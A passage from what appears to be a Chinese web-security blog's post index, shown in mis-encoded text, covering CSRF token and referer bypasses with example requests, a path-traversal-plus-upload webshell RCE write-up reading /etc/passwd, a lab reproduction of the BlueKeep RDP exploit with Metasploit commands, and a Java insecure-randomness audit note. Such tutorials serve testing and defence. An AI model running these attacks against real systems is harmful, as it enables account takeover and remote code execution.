çš„æ•æ„Ÿè¯·æ±‚æ˜¯é€šè¿‡POSTæ–¹æ³•å‘é€çš„ï¼Œé‚£ä¹ˆå°è¯•å°†å…¶è½¬æ¢ä¸ºGETè¯·æ±‚ã€‚å¦‚æœæ“ä½œæ—¶é€šè¿‡GETæ–¹æ³•å‘é€çš„ï¼Œé‚£ä¹ˆå°è¯•è½¬æ¢ä¸ºPOSTæ–¹æ³•ã€‚åº”ç”¨ç¨‹åºå¯èƒ½ä»ç„¶æ‰§è¡Œæ“ä½œï¼Œä¸”é€šå¸¸æ²¡æœ‰ä»»ä½•ä¿æŠ¤æœºåˆ¶ã€‚ ä¾‹å¦‚ï¼Œå¦‚ä¸‹è¯·æ±‚ï¼š 123456POST /change_passwordPOST body:new_password=qwertyå¯ä»¥è¢«æ”¹å†™æˆGET /change_password?new_password=qwerty ä¸‰ ã€CSRF tokençš„é˜²å¾¡æªæ–½ å› ä¸ºä¸€ä¸ªç«™ç‚¹ä½¿ç”¨äº†CSRF tokenä¸ä»£è¡¨è¿™ä¸ªtokenæ˜¯æœ‰æ•ˆéªŒè¯å¯¹åº”è¯·æ±‚æ“ä½œçš„ï¼Œå¯ä»¥å°è¯•å¦‚ä¸‹æ–¹æ³•ç»•è¿‡CSRFçš„tokenä¿æŠ¤ã€‚ 3.1 åˆ é™¤tokenå‚æ•°æˆ–å‘é€ç©ºtoken ä¸å‘é€tokenä¹Ÿå¯ä»¥æ­£å¸¸è¯·æ±‚æ•°æ®æ˜¯å› ä¸ºè¿™ç§é€»è¾‘é”™è¯¯åœ¨åº”ç”¨ç¨‹åºä¸­éå¸¸å¸¸è§ï¼šåº”ç”¨ç¨‹åºæœ‰æ—¶ä¼šåœ¨tokenå­˜åœ¨çš„æ—¶å€™æˆ–è€…tokenå‚æ•°ä¸ä¸ºç©ºçš„æ—¶å€™æ£€æŸ¥tokençš„æœ‰æ•ˆæ€§ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœä¸€ä¸ªè¯·æ±‚ä¸åŒ…å«tokenæˆ–è€…tokenå€¼ä¸ºç©ºï¼Œé‚£ä¹ˆä¹Ÿæ˜¯æœ‰å¯èƒ½ç»•è¿‡CSRFçš„é˜²å¾¡çš„ã€‚ ä¾‹å¦‚ï¼Œåˆæ³•è¯·æ±‚å¦‚ä¸‹ 12345678910111213POST /change_passwordPOST body:new_password=qwerty &amp;csrf_tok=871caef0757a4ac9691aceb9aad8b65bé‚£ä¹ˆå®æ–½è¿™ç§è¯·æ±‚ï¼šPOST /change_passwordPOST body:new_password=qwertyæˆ–è¿™ç§ï¼šPOST /change_passwordPOST body:new_password=qwerty&amp;csrf_tok= 3.2 ä»¤ç‰Œå…±äº« åº”ç”¨ç¨‹åºå¯èƒ½åªæ˜¯æ£€æŸ¥tokenæ˜¯å¦åˆæ³•ï¼Œä½†æ˜¯ä¸æ£€æŸ¥tokenæ˜¯å¦ç¡®å®å½’å±äºå½“å‰ç”¨æˆ·ã€‚å¦‚æœæ˜¯è¿™ç§æƒ…å†µçš„è¯ï¼Œä½ å¯ä»¥åœ¨payloadä¸­ç¡¬ç¼–ç ä¸€ä¸ªåˆæ³•æœ‰æ•ˆçš„tokenå³å¯ã€‚ å¦‚æœä¸€ä¸ªå—å®³è€…çš„tokenæ˜¯871caef0757a4ac9691aceb9aad8b65bï¼Œä½ è‡ªå·±çš„tokenæ˜¯YOUR_TOKENï¼Œé‚£ä¹ˆä½ å¯ä»¥å¾ˆå®¹æ˜“è·å–åˆ°è‡ªå·±çš„tokenä½†å¾ˆéš¾è·å–åˆ°å—å®³è€…çš„tokenã€‚å°è¯•åœ¨payloadä¸­æä¾›è‡ªå·±çš„tokenæ¥ç»•è¿‡CSRFé˜²å¾¡ã€‚ æ¢å¥è¯è¯´ï¼ŒåŸæœ¬åº”è¯¥å‘é€å¦‚ä¸‹è¯·æ±‚ï¼š 12345678POST /change_passwordPOST body:new_password=qwerty &amp;csrf_tok=871caef0757a4ac9691aceb9aad8b65bä½†æ˜¯æ”¹æˆå‘é€è¿™ä¸ªè¯·æ±‚ï¼šPOST /change_passwordPOST body:new_password=qwerty &amp;csrf_tok=YOUR_TOKEN 3.3 Sessionå›ºå®š æœ‰æ—¶å€™ç«™ç‚¹ä½¿ç”¨ä¸€ä¸ªåŒæäº¤cookieä½œä¸ºä¸€ä¸ªCSRFçš„é˜²å¾¡æªæ–½ã€‚è¿™ä¸ªè¡¨æ˜è¿™ä¸ªè¯·æ±‚éœ€è¦åŒ…å«ä¸€ä¸ªcookieï¼Œå…¶å€¼ä¸ºéšæœºtokenå€¼ï¼Œä¸”åŒæ—¶åœ¨è¯·æ±‚å‚æ•°ä¸­ä¹Ÿæœ‰ä¸€ä¸ªå­—æ®µå€¼ä¸ºè¯¥éšæœºtokenå€¼ã€‚å¦‚æœå€¼ç›¸åŒï¼Œé‚£ä¹ˆè¯·æ±‚æ˜¯åˆæ³•çš„ã€‚è¿™ç§é˜²å¾¡å½¢å¼æ˜¯éå¸¸å¸¸è§çš„ã€‚ å¦‚æœä¸€ä¸ªåŒæäº¤cookieç”¨åœ¨äº†é˜²å¾¡æªæ–½ä¸­ï¼Œé‚£ä¹ˆè¿™ä¸ªåº”ç”¨æœ‰å¯èƒ½æ²¡æœ‰å°†æœ‰æ•ˆçš„tokenä¿å­˜åœ¨æœåŠ¡å™¨ç«¯ã€‚æ‰€ä»¥å®ƒæ²¡æœ‰åŠæ³•æŒ‡å®štokenæ˜¯å¦åˆæ³•ï¼Œå¹¶ä¸”ä¹Ÿæœ‰å¯èƒ½å¾ˆå°‘æ£€æŸ¥cookieä¸­çš„tokenå€¼å’Œå‚æ•°ä¸­tokenå€¼æ˜¯ä¸æ˜¯ä¸€æ ·çš„ã€‚è¿™ä»£è¡¨ä½ å¯ä»¥å‘é€ä¸€ä¸ªå‡tokenï¼Œç„¶åä»ç„¶å¯ä»¥æœ‰æ•ˆå®æ–½CSRFæ”»å‡»ã€‚ è¿™ç§æ”»å‡»åŒ…å«ä¸¤ä¸ªæ­¥éª¤ï¼šç¬¬ä¸€æ­¥ï¼Œä½ ä½¿ç”¨ä¸€ä¸ªsessionå›ºå®šæŠ€æœ¯å»ç¡®è®¤å—å®³è€…çš„æµè§ˆå™¨ä½¿ç”¨çš„æ˜¯ä½ æä¾›çš„åŒ…å«å‡tokençš„sessionï¼Œç„¶åç¬¬äºŒæ­¥åœ¨å‚æ•°ä¸­ä½¿ç”¨åŒä¸€ä¸ªtokenæ¥æ‰§è¡Œè¿™ä¸ªCSRFæ”»å‡»ã€‚ sessionå›ºå®šã€‚è¿™æ˜¯ä¸€ä¸ªå¯ä»¥è®©ä½ æ§åˆ¶å—å®³è€…çš„cookieå­˜å‚¨çš„æ”»å‡»ï¼› 123456æ‰§è¡Œå¦‚ä¸‹è¯·æ±‚æ¥å®æ–½CSRFæ”»å‡»POST /change_passwordCookie: CSRF_TOK=FAKE_TOKEN;POST body:new_password=qwerty &amp;csrf_tok=FAKE_TOKEN 3.4 çªƒå–token é…åˆXSSï¼Œå‰ææ˜¯ç½‘ç«™ä¸å­˜åœ¨XSSæ¼æ´æˆ–è€…CSRF-Tokenå…·å¤‡httponlyå±æ€§ é‡å®šå‘ã€webç¼“å­˜æ¬ºéª—ã€clickjackingç­‰éƒ½å¯èƒ½å¯¼è‡´tokenæ³„éœ² 3.5 JsonpåŠ«æŒè·å–csrf_token https://www.jianshu.com/p/1cda296cf7d2 3.6 è§£ç CSRFä»¤ç‰Œ å°è¯•è¿›è¡ŒMD5æˆ–Base64ç¼–ç  3.6 ä¿®æ”¹è¯·æ±‚æ–¹æ³• postæ”¹ä¸ºget å››ã€ Refererå­—æ®µçš„CSRFé˜²å¾¡ å¦‚æœattack.comæ˜¯ä¸€ä¸ªå¯æ§çš„åŸŸåï¼Œbank.comæ˜¯ä¸€ä¸ªè¦æ”»å‡»çš„åŸŸåã€‚è¿™ä¸ªç«™ç‚¹æ²¡æœ‰ä½¿ç”¨CSRF tokenä½†æ˜¯æ£€æŸ¥äº†refererå­—æ®µã€‚ä½ åº”è¯¥æ€ä¹ˆåšï¼Ÿ 4.1 Refererå€¼ä¸ºç©ºæˆ–ç§»é™¤refererå­—æ®µ é¦–å…ˆï¼Œæˆ‘ä»¬å¯¹ç©ºRefererçš„å®šä¹‰ä¸ºï¼ŒReferer å¤´éƒ¨çš„å†…å®¹ä¸ºç©ºï¼Œæˆ–è€…ï¼Œä¸€ä¸ªHTTPè¯·æ±‚ä¸­æ ¹æœ¬ä¸åŒ…å«Refererå¤´éƒ¨ å’Œå‘é€ä¸€ä¸ªç©ºtokenå€¼ç›¸åŒï¼Œæœ‰æ—¶å€™ä½ åªéœ€ç®€å•åœ°ç§»é™¤refererå­—æ®µå°±å¯ä»¥ç»•è¿‡CSRFé˜²å¾¡ã€‚ä½ å¯ä»¥æ·»åŠ å¦‚ä¸‹metaæ ‡ç­¾åˆ°å­˜åœ¨æ¼æ´çš„é¡µé¢ã€‚ æ‰©å±•æµ‹è¯•é¢ï¼šä¾‹å¦‚jsonpåŠ«æŒ 123&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;æˆ–&lt;meta name =&quot;referrer&quot; content =&quot;no-referrer&quot;&gt; åº”ç”¨ç¨‹åºå¯èƒ½åªæ˜¯åœ¨å‘é€åæ‰ä¼šéªŒè¯ï¼Œè¿™ç§æƒ…å†µä¸‹ä½ å¯ä»¥ç»•è¿‡å…¶CSRFé˜²å¾¡ã€‚ 4.2 è‡ªå»ºæœåŠ¡å™¨è·¯å¾„å¸¦refererå­—æ®µå åŸç†å°±æ˜¯åœ¨è·¯å¾„ä¸Šåˆ›å»ºæˆåŸæœ¬refererä¸­æœ‰çš„å­—æ®µåï¼Œå¦‚æœæ ¡éªŒåªæ˜¯åˆ¤æ–­æ˜¯å¦åŒ…å«ã€‚ æ¡ˆä¾‹ï¼š https://www.zybuluo.com/1kbfree/note/1210937 4.3 åˆ©ç”¨URLè·³è½¬ æ¡ˆä¾‹ï¼š https://www.zybuluo.com/1kbfree/note/1239095 4.3 ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼ å¦‚æœrefereræ£€æŸ¥æ˜¯åŸºäºç™½åå•çš„ï¼Œä½ å¯ä»¥å°è¯•ç»•è¿‡éªŒè¯URLçš„æ­£åˆ™è¡¨è¾¾å¼ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥å°è¯•åœ¨refererçš„URLä¸­å°†å—å®³è€…åŸŸåç½®äºäºŒçº§åŸŸååŒºåŸŸæˆ–è€…URLç›®å½•åŒºåŸŸã€‚ å¦‚æœä¸€ä¸ªç«™ç‚¹åœ¨refererå­—æ®µæ£€æŸ¥â€œbank.comâ€å­—æ®µï¼Œé‚£ä¹ˆâ€œbank.com.attacker.comâ€æˆ–â€attakcer.com/bank.comâ€å¯èƒ½å¯ä»¥ç»•è¿‡è¿™ç§æ£€æµ‹ã€‚","categories":[{"name":"WEBå®‰å…¨","slug":"WEBå®‰å…¨","permalink":"http://www.vkxss.top/categories/WEBå®‰å…¨/"}],"tags":[{"name":"å‰ç«¯å®‰å…¨-CSRF","slug":"å‰ç«¯å®‰å…¨-CSRF","permalink":"http://www.vkxss.top/tags/å‰ç«¯å®‰å…¨-CSRF/"}]},{"title":"è·¯å¾„éå†çš„RCE","slug":"æ¸—é€æµ‹è¯•-è·¯å¾„éå†çš„RCE","date":"2019-09-10T07:30:08.000Z","updated":"2019-11-12T08:04:54.794Z","comments":true,"path":"2019/09/10/æ¸—é€æµ‹è¯•-è·¯å¾„éå†çš„RCE/","link":"","permalink":"http://www.vkxss.top/2019/09/10/æ¸—é€æµ‹è¯•-è·¯å¾„éå†çš„RCE/","excerpt":"","text":"0x00 è·¯å¾„éå†çš„RCE 0x00 è·¯å¾„éå†çš„RCE å¦‚ä¸‹æ˜¯åˆ©ç”¨ç›®å½•éå†ï¼Œé…åˆæ–‡ä»¶ä¸Šä¼ æ¼æ´çš„ä¸€ä¸ªRCEçš„è®°å½•ã€‚ æ¡ä»¶ï¼š å­˜åœ¨ç›®å½•éå†æ¼æ´ å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ å·²çŸ¥ä¸Šä¼ çš„è·¯å¾„ï¼Œæ— è®¿é—®æƒé™çš„æƒ…å†µ é¦–å…ˆï¼Œåœ¨æµè§ˆæ—¶ï¼Œæˆ‘å‘ç°ä¸€ä¸ªå¼•èµ·æˆ‘æ³¨æ„çš„å‚æ•°ï¼ŒframeManagerPathæ˜¯base64å‚æ•°ã€‚æ­¤è·¯å¾„å§‹ç»ˆè¿”å›javascriptä»£ç ã€‚å°±åƒä¸‹é¢çš„å›¾åƒï¼š è§£ç è¯¥å€¼åï¼Œæˆ‘å¯ä»¥æ³¨æ„åˆ°è¯¥å€¼æ˜¯æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„ã€‚ æ¥ä¸‹æ¥ï¼Œæ­¥éª¤æ˜¯å°†å­—ç¬¦ä¸²/ etc / passwdç¼–ç ä¸ºbase64æ ¼å¼ï¼Œä»¥å°è¯•éå†æŸäº›è·¯å¾„ï¼Œä»¤æˆ‘æƒŠè®¶çš„æ˜¯:)ã€‚OBSï¼šL2V0Yy9wYXNzd2Q = == / etc / passwd ä½†æ˜¯ï¼Œåœ¨æ‰¾åˆ°è¯¥è·¯å¾„éå†ä¹‹å‰ï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªä¸Šä¼ é”™è¯¯çš„æ–‡ä»¶ï¼Œä½¿æˆ‘èƒ½å¤Ÿä¸Šä¼  ä»»ä½•ç±»å‹çš„æ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘æ— æ³•è®¿é—®/ wwwroot / pathï¼š/ä¸­çš„æ ¹ç›®å½•ã€‚ä¸‹å›¾æ˜¾ç¤ºäº†æ­¤æ–‡ä»¶ä¸Šä¼ çš„è¯·æ±‚å’Œå“åº”ã€‚ ä¸‹ä¸€æ­¥ï¼Œæˆ‘å°†æ˜¾ç¤ºä¸€ä¸ªWebshelâ€‹â€‹lï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ é€šè¿‡å°†è¿™ä¸¤ä¸ªé¡¹ç›®ç»“åˆåœ¨ä¸€èµ·ï¼Œå¯ä»¥é€šè¿‡è·¯å¾„éå†è®¿é—®webshelâ€‹â€‹lï¼Œå¹¶é€šè¿‡webshelâ€‹â€‹låœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œå‘½ä»¤ã€‚cmFudC9ibG9nL3BhdGh0cmF2ZXJzYWwvaW1hZ2UwNS5wbmc = ==â€œè·¯å¾„wwwrootç¼–ç ä¸ºem base64ï¼ˆæ¨¡ç³Šï¼‰â€ è¯·æ±‚ å“åº” ä¸‹ä¸€ä¸ªå›¾åƒè¯´æ˜äº†æœ€ç»ˆç»“æœã€‚","categories":[{"name":"WEBå®‰å…¨","slug":"WEBå®‰å…¨","permalink":"http://www.vkxss.top/categories/WEBå®‰å…¨/"}],"tags":[{"name":"WEBæ¸—é€æµ‹è¯•","slug":"WEBæ¸—é€æµ‹è¯•","permalink":"http://www.vkxss.top/tags/WEBæ¸—é€æµ‹è¯•/"}]},{"title":"CVE-2019-0708 è¿œç¨‹æ¡Œé¢ä»£ç æ‰§è¡Œæ¼æ´å¤ç°","slug":"CVE-2019-0708","date":"2019-09-07T07:30:08.000Z","updated":"2019-09-20T02:01:32.249Z","comments":true,"path":"2019/09/07/CVE-2019-0708/","link":"","permalink":"http://www.vkxss.top/2019/09/07/CVE-2019-0708/","excerpt":"","text":"0X00 ç®€ä»‹ 0X01 ç¯å¢ƒå‡†å¤‡ 0x02 æ¼æ´å¤ç° 0x03 æ¼æ´æ£€æµ‹ä¿®å¤å·¥å…·&amp;æ‰¹é‡å¿«é€Ÿæ‰«ææ£€æµ‹å·¥å…·&amp;çƒ­è¡¥ä¸å·¥å…· 0X00 ç®€ä»‹ Microsoft Windowsæ˜¯ç¾å›½å¾®è½¯å…¬å¸å‘å¸ƒçš„è§†çª—æ“ä½œç³»ç»Ÿã€‚è¿œç¨‹æ¡Œé¢è¿æ¥æ˜¯å¾®è½¯ä»Windows 2000 Serverå¼€å§‹æä¾›çš„åŠŸèƒ½ç»„ä»¶ã€‚ 2019å¹´5æœˆ14æ—¥ï¼Œå¾®è½¯å‘å¸ƒäº†æœˆåº¦å®‰å…¨æ›´æ–°è¡¥ä¸ï¼Œä¿®å¤äº†è¿œç¨‹æ¡Œé¢åè®®ï¼ˆRDPï¼‰è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´ï¼Œå‘ç›®æ ‡ Windowsä¸»æœºå‘é€æ¶æ„æ„é€ è¯·æ±‚ï¼Œå¯ä»¥åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚ è¿‘æ—¥ï¼ŒMetasploitå‘å¸ƒäº†è¯¥æ¼æ´çš„åˆ©ç”¨æ¨¡å—ï¼ŒGitHubç½‘ç«™ä¸Šä¹Ÿå…¬å¼€äº†è¯¥æ¼æ´çš„åˆ©ç”¨ä»£ç ï¼Œå¼•èµ·äº†å®‰å…¨ç ”ç©¶äººå‘˜çš„å¹¿æ³›å…³æ³¨ã€‚ç›®å‰è¯¥æ¼æ´åˆ©ç”¨ä»…å¯¹Windows 7 SP1 x64ä¸Windows 2008 R2 x64ï¼ˆéç³»ç»Ÿé»˜è®¤é…ç½®ï¼‰ç³»ç»Ÿç‰ˆæœ¬æœ‰æ•ˆï¼Œåœ¨è™šæ‹Ÿæœºç¯å¢ƒä¸‹å¤ç°æˆåŠŸã€‚ 0X01 ç¯å¢ƒå‡†å¤‡ æ”»å‡»æœº:kali é¶æœºï¼šWin7 12Windows7 SP1ä¸‹è½½é“¾æ¥ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/ 0x02 æ¼æ´å¤ç° msfå¿…é¡»ä½¿ç”¨msf5ï¼ˆ#msfupdateï¼‰ ä¸‹è½½exp:kaliæ”»å‡»æœºä¸‹è½½metasploitæ”»å‡»è„šæœ¬ï¼Œkaliä¸­æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ 1234wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb å›¾ï¼šä¸‹è½½æ”»å‡»è½½è· åšå¦‚ä¸‹æ›¿æ¢ï¼ˆå¤§éƒ¨åˆ†äººmsféƒ½è£…åœ¨å¦‚ä¸‹ä½ç½®ï¼‰ 12345678rdp.rb -&gt; /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rbrdp_scanner.rb -&gt; /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rbcve_2019_0708_bluekeep.rb -&gt; /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rbcve_2019_0708_bluekeep_rce.rb -&gt; /usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb åšå¦‚ä¸‹æ›¿æ¢ï¼ˆæˆ‘çš„ä½ç½®ï¼‰ 12345678rdp.rb -&gt; /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rbrdp_scanner.rb -&gt; /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rbcve_2019_0708_bluekeep.rb -&gt; /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rbcve_2019_0708_bluekeep_rce.rb -&gt; /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb reload_all é‡æ–°åŠ è½½æ‰€æœ‰çš„æ¨¡å—ï¼Œå°†æ–°æ·»åŠ çš„æ¨¡å—åŠ è½½ä¸Šã€‚æˆåŠŸå¦‚ä¸‹å›¾ï¼š å›¾ï¼šæˆåŠŸåŠ è½½æ”»å‡»è½½è· ä½¿ç”¨æ”»å‡»è½½è· 1234&gt; use exploit/rdp/cve_2019_0708_bluekeep_rce&gt; set rhosts é¶æœºIP&gt; set target 3 ï¼ˆæ ¹æ®é¶æœºè€Œå®šï¼‰&gt; exploit æˆåŠŸåˆ©ç”¨ï¼ï¼ï¼ï¼ 1&gt; set target 3 å›¾ï¼šè“å± å†æ¥ä¸€æ¬¡ï¼ï¼ï¼ï¼ 1&gt; set target 1 å›¾ï¼šä¼šè¯ 0x03 æ¼æ´æ£€æµ‹ä¿®å¤å·¥å…·&amp;æ‰¹é‡å¿«é€Ÿæ‰«ææ£€æµ‹å·¥å…·&amp;çƒ­è¡¥ä¸å·¥å…· ä¸‹è½½é¡µé¢ï¼š 1https://www.qianxin.com/other/CVE-2019-0708 ä½¿ç”¨è¯´æ˜ï¼š 12345&gt;ä¸‹è½½æ–‡ä»¶è¿›è¡Œè§£å‹ã€‚&gt;ä½¿ç”¨win+Rå¿«æ·é”®æˆ–å¼€å§‹èœå•é€‰æ‹©â€œè¿è¡Œâ€ï¼Œè¾“å…¥cmdã€‚è°ƒèµ·å‘½ä»¤è¡Œå·¥å…·ã€‚&gt;åœ¨å‘½ä»¤è¡Œå·¥å…·ï¼Œæ‰§è¡Œå‘½ä»¤åˆ°å·¥å…·æ‰€åœ¨æ–‡ä»¶å¤¹&gt;è¾“å…¥å‘½ä»¤å¯¹åº”åŠŸèƒ½ï¼Œå¯ç”¨çƒ­è¡¥ä¸å‘½ä»¤ï¼šQKShield.exe /enable ï¼›ç¦ç”¨çƒ­è¡¥ä¸å‘½ä»¤ï¼šQKShield.exe/disable ã€‚&gt;é‡å¯ç³»ç»Ÿåï¼Œéœ€è¦é‡æ–°è¿è¡Œå‘½ä»¤è¡Œæ¥å¯ç”¨çƒ­è¡¥ä¸ å®ç°æ•ˆæœï¼š 123456789101112131415åœ¨å·¥å…·æ”¯æŒçš„ç³»ç»Ÿä¸­å¯ç”¨çƒ­è¡¥ä¸åï¼Œç”¨æ¼æ´æ‰«æå·¥å…·æ‰«æç»“æœä¸ºæ²¡æœ‰æ¼æ´ã€‚æ¼æ´æ‰«æå·¥å…·ä¸‹è½½åœ°å€ï¼šhttps://www.qianxin.com/other/CVE-2019-0708æ”¯æŒç³»ç»Ÿï¼šWindows XP for 32-bit Systems Service Pack 3Windows 7 for 32-bit SystemsWindows 7 for x64-based SystemsWindows 7 for 32-bit Systems Service Pack 1Windows 7 for x64-based Systems Service Pack 1Windows Server 2003 for 32-bit Systems Service Pack 2Windows Server 2003 R2 for 32-bit Systems Service Pack2Windows Server 2008 for 32-bit Systems Service Pack 2Windows Server 2008 for 32-bit Systems Service Pack 2(Server Core installation)Windows Server 2008 for x64-based Systems Service Pack2Windows Server 2008 for x64-based Systems Service Pack2 (Server Core installation)Windows Server 2008 R2 for x64-based Systems ServicePack 1Windows Server 2008 R2 for x64-based Systems ServicePack 1 (Server Core installation) æš‚ä¸æ”¯æŒçš„ç³»ç»Ÿï¼š 123Windows Server 2003 for x64-based Systems Service Pack2Windows Server 2008 for Itanium-Based Systems ServicePack 2Windows Server 2008 R2 for Itanium-Based SystemsService Pack 1","categories":[{"name":"CVE-2019","slug":"CVE-2019","permalink":"http://www.vkxss.top/categories/CVE-2019/"}],"tags":[{"name":"CVE-2019-0708","slug":"CVE-2019-0708","permalink":"http://www.vkxss.top/tags/CVE-2019-0708/"}]},{"title":"Insecure Randomness","slug":"ä»£ç å®¡è®¡-Insecure Randomness","date":"2019-08-22T06:10:40.000Z","updated":"2019-11-19T06:38:29.828Z","comments":true,"path":"2019/08/22/ä»£ç å®¡è®¡-Insecure Randomness/","link":"","permalink":"http://www.vkxss.top/2019/08/22/ä»£ç å®¡è®¡-Insecure Randomness/","excerpt":"","text":"1ã€Insecure Randomness 1.1ã€æè¿°ï¼š 1.2ã€å®¡è®¡æ–¹æ³•ï¼š 1.3ã€æ¼æ´ç¤ºä¾‹: 1.4ã€æ¼æ´å±å®³ï¼š 1.5ã€ä¿®å¤æ–¹æ¡ˆï¼š 1ã€Insecure Randomness1.1ã€æè¿°ï¼š ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼ˆPRNGï¼‰ä½¿ç”¨ç¡®å®šæ€§æ•°å­¦ç®—æ³•æ¥äº§ç”Ÿå…·æœ‰è‰¯å¥½ç»Ÿè®¡å±æ€§çš„æ•°å­—åºåˆ—ã€‚ä½†æ˜¯è¿™ç§æ•°å­—åºåˆ—å¹¶ä¸å…·æœ‰çœŸæ­£çš„éšæœºç‰¹æ€§ã€‚ä¼ªéšæœºæ•°ç”Ÿæˆå™¨é€šå¸¸ä»¥ä¸€ä¸ªç®—æœ¯ç§å­å€¼ä¸ºèµ·å§‹ã€‚ç®—æ³•ä½¿ç”¨è¯¥ç§å­å€¼ç”Ÿæˆä¸€ä¸ªè¾“å‡ºä»¥åŠä¸€ä¸ªæ–°çš„ç§å­ï¼Œè¿™ä¸ªç§å­åˆè¢«ç”¨æ¥ç”Ÿæˆä¸‹ä¸€ä¸ªéšæœºå€¼ï¼Œä»¥æ­¤ç±»æ¨ã€‚Java API æä¾›äº†ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼ˆPRNGï¼‰â€”â€” java.util.Randomç±»ã€‚è¿™ä¸ªä¼ªéšæœºæ•°ç”Ÿæˆå™¨å…·æœ‰å¯ç§»æ¤æ€§å’Œå¯é‡å¤æ€§ã€‚å› æ­¤ï¼Œå¦‚æœä¸¤ä¸ªjava.util.Randomç±»çš„å®ä¾‹åˆ›å»ºæ—¶ä½¿ç”¨çš„æ˜¯ç›¸åŒçš„ç§å­å€¼ï¼Œé‚£ä¹ˆå¯¹äºæ‰€æœ‰çš„Javaå®ç°ï¼Œå®ƒä»¬å°†ç”Ÿæˆç›¸åŒçš„æ•°å­—åºåˆ—ã€‚åœ¨ç³»ç»Ÿé‡å¯æˆ–åº”ç”¨ç¨‹åºåˆå§‹åŒ–æ—¶ï¼ŒSeedå€¼æ€»æ˜¯è¢«é‡å¤ä½¿ç”¨ã€‚åœ¨ä¸€äº›å…¶ä»–æƒ…å†µä¸‹ï¼Œseedå€¼æ¥è‡ªç³»ç»Ÿæ—¶é’Ÿçš„å½“å‰æ—¶é—´ã€‚æ”»å‡»è€…å¯ä»¥åœ¨ç³»ç»Ÿçš„ä¸€äº›å®‰å…¨è„†å¼±ç‚¹ä¸Šç›‘å¬ï¼Œå¹¶æ„å»ºç›¸åº”çš„æŸ¥è¯¢è¡¨é¢„æµ‹å°†è¦ä½¿ç”¨çš„seedå€¼ã€‚ 1.2ã€å®¡è®¡æ–¹æ³•ï¼š å…¨å±€æœç´¢ä»¥ä¸‹å…³é”®è¯ â€œrandomâ€ 1.3ã€æ¼æ´ç¤ºä¾‹: ä¾‹å¦‚åœ¨æ˜“äºçŒœæµ‹çš„å¯†ç ã€å¯é¢„æµ‹çš„åŠ å¯†å¯†é’¥ã€éªŒè¯ç ç”Ÿæˆã€æŠ½å¥–æ´»åŠ¨ã€UUIDç”Ÿæˆã€SessionIDç”Ÿæˆã€Tokenç”Ÿæˆã€CSRF Tokenã€æ‰¾å›å¯†ç Tokenã€æ¸¸æˆï¼ˆéšæœºå…ƒç´ çš„ç”Ÿæˆï¼‰ã€å¯†ç åº”ç”¨åœºæ™¯ã€ç”Ÿæˆå¯†é’¥ï¼šå¯¹ç§°å¯†ç ï¼Œæ¶ˆæ¯è®¤è¯ã€ç”Ÿæˆå¯†é’¥å¯¹ï¼šå…¬é’¥å¯†ç ï¼Œæ•°å­—ç­¾åã€ç”ŸæˆIVï¼š ç”¨äºåˆ†ç»„å¯†ç çš„CBCï¼ŒCFBå’ŒOFBæ¨¡å¼ã€ç”Ÿæˆnonce: ç”¨äºé˜²å¾¡é‡æ”¾æ”»å‡»; åˆ†ç»„å¯†ç çš„CTRæ¨¡å¼ã€ç”Ÿæˆç›ï¼šç”¨äºåŸºäºå£ä»¤çš„å¯†ç PBEç­‰ï¼Œå¯èƒ½ä¼šé™ä½ç³»ç»Ÿå®‰å…¨æ€§ã€‚ å›¾1ï¼šæ¼æ´ä»£ç  1.4ã€æ¼æ´å±å®³ï¼š ç”Ÿæˆçš„éšæœºæ•°å¾ˆå®¹æ˜“é¢„æµ‹ï¼Œå¯èƒ½ä¼šé™ä½ç³»ç»Ÿå®‰å…¨æ€§ã€‚ 1.5ã€ä¿®å¤æ–¹æ¡ˆï¼š å› æ­¤ï¼Œjava.util.Randomç±»ä¸èƒ½ç”¨äºå®‰å…¨æ•æ„Ÿåº”ç”¨æˆ–è€…æ•æ„Ÿæ•°æ®ä¿æŠ¤ã€‚åº”ä½¿ç”¨æ›´åŠ å®‰å…¨çš„éšæœºæ•°ç”Ÿæˆå™¨ï¼Œä¾‹å¦‚java.security.SecureRandomç±»ã€‚ å›¾2ï¼šä¿®å¤ä»£ç ","categories":[{"name":"JAVA","slug":"JAVA","permalink":"http://www.vkxss.top/categories/JAVA/"}],"tags":[{"name":"Javaä»£ç å®¡è®¡","slug":"Javaä»£ç 